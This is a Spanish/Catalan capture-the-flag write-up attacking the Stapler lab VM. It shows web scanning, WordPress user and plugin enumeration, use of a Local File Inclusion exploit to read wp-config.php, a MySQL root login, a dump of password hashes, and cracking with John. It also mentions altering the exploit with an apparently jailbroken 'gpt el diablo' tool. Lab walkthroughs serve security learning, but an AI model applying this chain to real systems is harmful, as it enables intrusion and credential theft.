
### Buscando vulnerabilidades con nikito

El comando nikto -h 10.0.2.4:12380 está utilizando la herramienta de escaneo de seguridad web Nikto para realizar una serie de pruebas contra el servidor web que se encuentra en la dirección IP 10.0.2.4 en el puerto 12380. Nikto es conocido por realizar pruebas rápidas para encontrar vulnerabilidades comunes en los servidores web.
Los resultados indican que:
• El servidor está ejecutando Apache/2.4.18 en Ubuntu.
• Falta el encabezado HTTP X-Frame-Options, lo que puede hacer al sitio web vulnerable a ataques de clickjacking.
• Hay un encabezado inusual llamado 'dave' presente en las respuestas del servidor, lo que podría ser un indicio de una configuración personalizada o un posible indicio de vulnerabilidad.
• No se ha configurado el encabezado X-Content-Type-Options, lo que podría permitir que los navegadores interpreten el contenido de manera diferente al tipo MIME declarado, lo cual puede ser explotado en ciertos tipos de ataques.

Esto no funciona, entonces le tiro con fuzz :
```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.0.2.4:12380/FUZZ
```

### Contenido del archivo robots.txt

User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/

#### Executar un wpscan a la pàgina /blogblog/ per enumerar qualsevol usuari,.
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ wpscan --url https://10.0.2.4:12380/blogblog/ --enumerate u --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart


i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
 ## Haurem d’executar un segon escaneig per trobar plugins vulnerables.
 
```bash 
┌──(kali㉿kali)-[~]
└─$ wpscan --url https://192.168.1.203:12380/blogblog --plugins-detection mixed --disable-tls-checks

--disable-tls-checks Desactiva la verificació del certificat SSL/TLS


[+] Enumerating All Plugins (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:11:54 <=================================================================================================================================================> (104649 / 104649) 100.00% Time: 00:11:54
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.1.203:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.1.203:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.1.203:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 5.3.1
 | Last Updated: 2024-01-17T22:32:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.1.203:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.1.203:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.1.203:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.8.2
 | Last Updated: 2023-09-04T20:40:00.000Z
 | Readme: https://192.168.1.203:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.203:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <========================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

### Hem trobat 4 plugins. Podem utilitzar searchsploit per cercar exploits.
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit advanced video       
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                                                                                                                           | php/webapps/39646.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Aquest exploit és un script Python i haurem de fer algunes modificacions.
El primer que fem és copiar l'última versió de l’exploit des de la seva ubicació actual al nostre directori de Stapler.

Creeu un fitxer anomenat 39646.py amb el vostre editor de text preferit. Utilitzeu el navegador Kali i copieu el codi de dades del lloc següent i enganxeu-lo al fitxer recentment creat.
https://gist.github.com/kongwenbin/8e89f553641bd76b1ee4bb93460fbb2c
Modifiqueu l'script amb l'adreça IP del vostre lloc de WordPress.

Despues de modificar el script de python con el gpt el diablo he logrado crear la imagen que esta en la ruta:
```bash
https://192.168.1.203:12380/blogblog/wp-content/uploads/

┌──(kali㉿kali)-[~/stapler]
└─$ python 39646.py
 ```
 ### Ahora procedo a hacer un get para descargarme la imagen :                                                       
 ```bash
┌──(kali㉿kali)-[~/stapler]
└─$ wget --no-check-certificate https://192.168.1.203:12380/blogblog/wp-content/uploads/1631907254.jpeg

--2024-03-01 14:13:23--  https://192.168.1.203:12380/blogblog/wp-content/uploads/1631907254.jpeg
Connecting to 192.168.1.203:12380... connected.
WARNING: The certificate of ‘192.168.1.203’ is not trusted.
WARNING: The certificate of ‘192.168.1.203’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘192.168.1.203’
HTTP request sent, awaiting response... 200 OK
Length: 3042 (3.0K) [image/jpeg]
Saving to: ‘1631907254.jpeg’

1631907254.jpeg                                           100%[====================================================================================================================================>]   2.97K  --.-KB/s    in 0.001s  

2024-03-01 14:13:23 (4.27 MB/s) - ‘1631907254.jpeg’ saved [3042/3042]
```

### Le cambio la extension de la imagen a txt para ver la informacion de la base de datos:. Ya tengo toda la información de la base de datos:    

```bash
┌──(kali㉿kali)-[~/stapler]
└─$ ls
1631907254.jpeg  39646.py  enumerate.sh  ls  note  rutas.txt  todo-list.txt  vsftpd.conf  wordpress-4.tar.gz
```
cambio de jpeg a txt
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ mv 1631907254.jpeg 1631907254.txt
```
Hago un cat para ver el contenido del fichero
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ cat 1631907254.txt 
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');
```

### Hem enumerat les credencials root del servidor MySQL. Ara ens podem connectar al servidor MySQL.

La contraseña para el usuario root de la base de datos en el archivo wp-config.php que proporcionaste es #plbkac. Esta es la contraseña que se utiliza para conectar WordPress a la base de datos MySQL, y debe mantenerse en secreto para asegurar la base de datos.

```bash
┌──(kali㉿kali)-[~/stapler]
└─$ mysql -u root -p -h 192.168.1.203 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.009 sec)

MySQL [(none)]> 
```

----------------------------------------
### Me conecto a la base de datos wordpress
```bash
MySQL [(none)]> use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> SELECT user_login, user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.002 sec)

```

### Una vez tengo todos los usuarios y sus hashes, procedo a crear un fichero para añadirlo a john_hash.txt.
```bash

┌──(kali㉿kali)-[~/stapler]
└─$ nano john_hash.txt
```
### Des pues de crear el fichero con el nombre de john y el hash de su contraseña procedo a crackear el hash:
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
incorrect        (John)     
1g 0:00:00:06 DONE (2024-03-02 05:21) 0.1479g/s 27351p/s 27351c/s 27351C/s ireland4..iloveaj2
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/stapler]
└─$ john --show --format=phpass john_hash.txt

John:incorrect

1 password hash cracked, 0 left
```


Ara tenim les credencials d’inici de sessió d’un usuari de WordPress que creiem que és administrador. Podem intentar iniciar la sessió al WordPress com John mitjançant la contrasenya.

https://192.168.1.203:12380/blogblog/wp-login.php
usuario john
contrasena: incorrect
Con estas credenciales puedo acceder a la consola de admin sin problemas
